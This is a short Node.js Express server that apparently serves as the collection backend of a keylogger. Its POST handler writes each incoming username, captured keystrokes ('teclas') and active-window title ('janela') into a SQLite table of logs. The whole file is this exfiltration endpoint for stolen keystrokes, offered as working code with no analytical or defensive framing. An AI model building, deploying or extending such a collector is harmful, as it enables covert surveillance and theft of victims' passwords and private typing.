import express from "express";
import Database from "better-sqlite3";

const PORT = process.argv[2];

const server = express()
server.use(express.json())

server.get('/', (req, res) => {
    res.send("Server running");
});

server.post('/', (req, res) => {
    const db = new Database("seraphim.db");
    db.exec(`CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    payload_content TEXT NOT NULL,
    window TEXT NOT NULL
  )`);

    const insertPayload = db.prepare(`INSERT INTO logs (username, payload_content, window) VALUES (?, ?, ?)`);

    try {
        insertPayload.run(req.body.usuario, req.body.teclas.trimEnd(), req.body.janela);
    } catch (error) {
        res.status(500);
    }

    db.close();
    res.status(200);
});

server.listen(PORT);